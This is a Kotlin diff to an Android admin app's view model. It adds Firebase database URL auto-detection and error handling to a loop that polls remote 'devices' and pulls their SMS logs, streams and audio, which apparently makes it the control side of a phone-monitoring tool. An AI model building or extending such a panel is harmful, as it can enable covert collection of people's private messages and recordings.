@@ -78,6 +78,17 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     private var streamPollingJob: Job? = null
     private var lastKnownAlertTime = 0L
 
+    // Database URL and status states
+    private val prefs = application.getSharedPreferences("admin_prefs", Context.MODE_PRIVATE)
+    
+    private val _currentDatabaseUrl = MutableStateFlow(
+        prefs.getString("db_url", "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com") ?: "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"
+    )
+    val currentDatabaseUrl: StateFlow<String> = _currentDatabaseUrl.asStateFlow()
+
+    private val _connectionError = MutableStateFlow<String?>(null)
+    val connectionError: StateFlow<String?> = _connectionError.asStateFlow()
+
     // Audio Player State
     private var mediaPlayer: MediaPlayer? = null
     private var tempAudioFile: File? = null
@@ -93,9 +104,67 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     val audioPosition: StateFlow<Int> = _audioPosition.asStateFlow()
 
     init {
-        // Load default paired tokens if any
+        connector.updateRootUrl(_currentDatabaseUrl.value)
         viewModelScope.launch {
+            autoDetectDatabaseUrl()
             loadAllDevicesAndStartSync()
+        }
+    }
+
+    fun updateDatabaseUrl(url: String) {
+        val cleanedUrl = url.trim().removeSuffix("/")
+        prefs.edit().putString("db_url", cleanedUrl).apply()
+        _currentDatabaseUrl.value = cleanedUrl
+        connector.updateRootUrl(cleanedUrl)
+        _connectionError.value = null
+        // Trigger reload
+        loadAllDevicesAndStartSync()
+    }
+
+    private suspend fun autoDetectDatabaseUrl() {
+        val current = _currentDatabaseUrl.value
+        val candidates = listOf(
+            "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com",
+            "https://studio-3242759193-af8cb-default-rtdb.europe-west1.firebasedatabase.app",
+            "https://studio-3242759193-af8cb.firebaseio.com",
+            "https://studio-3242759193-af8cb.europe-west1.firebasedatabase.app",
+            "https://studio-3242759193-af8cb-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "https://studio-3242759193-af8cb.asia-southeast1.firebasedatabase.app"
+        )
+        
+        // Try current saved first
+        if (testUrlReachable(current)) {
+            Log.d("AdminViewModel", "Saved DB URL is working: $current")
+            return
+        }
+        
+        // Otherwise, probe candidates
+        for (candidate in candidates) {
+            if (candidate != current && testUrlReachable(candidate)) {
+                Log.d("AdminViewModel", "Found responsive candidate, auto-switching: $candidate")
+                updateDatabaseUrl(candidate)
+                return
+            }
+        }
+    }
+
+    private suspend fun testUrlReachable(url: String): Boolean = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
+        val client = okhttp3.OkHttpClient.Builder()
+            .connectTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
+            .readTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
+            .build()
+        val req = okhttp3.Request.Builder()
+            .url("$url/.json?shallow=true")
+            .get()
+            .build()
+        try {
+            client.newCall(req).execute().use { resp ->
+                // As long as the request resolved (even if permission denied / 401 / 403), it means the URL is reachable
+                return@withContext true
+            }
+        } catch (e: Exception) {
+            Log.e("AdminViewModel", "Database URL $url is not reachable", e)
+            return@withContext false
         }
     }
 
@@ -158,18 +227,17 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 try {
                     val list = connector.getDiscoveredDevices()
                     _devices.value = list
-                    
-                    // If no device is selected, auto select the first available
-                    if (_selectedDeviceToken.value == null && list.isNotEmpty()) {
-                        _selectedDeviceToken.value = list.first().id
-                    }
+                    _connectionError.value = null
 
                     _selectedDeviceToken.value?.let { token ->
-                        // Sync current device details and streams
-                        syncCurrentDeviceAll(token)
+                        if (token.isNotBlank()) {
+                            // Sync current device details and streams
+                            syncCurrentDeviceAll(token)
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e("AdminViewModel", "Error in sync loop", e)
+                    _connectionError.value = e.localizedMessage ?: e.message ?: "فشل الاتصال بخادم قاعدة البيانات"
                 }
                 delay(4000) // Poll every 4 seconds for immediate action
             }
@@ -178,11 +246,14 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     private fun triggerSingleDeviceFetch(token: String) {
         viewModelScope.launch {
-            syncCurrentDeviceAll(token)
+            if (token.isNotBlank()) {
+                syncCurrentDeviceAll(token)
+            }
         }
     }
 
     private suspend fun syncCurrentDeviceAll(token: String) {
+        if (token.isBlank()) return
         // 1. Fetch SMS Logs
         val sms = connector.getSmsLogs(token)
         _smsLogs.value = sms
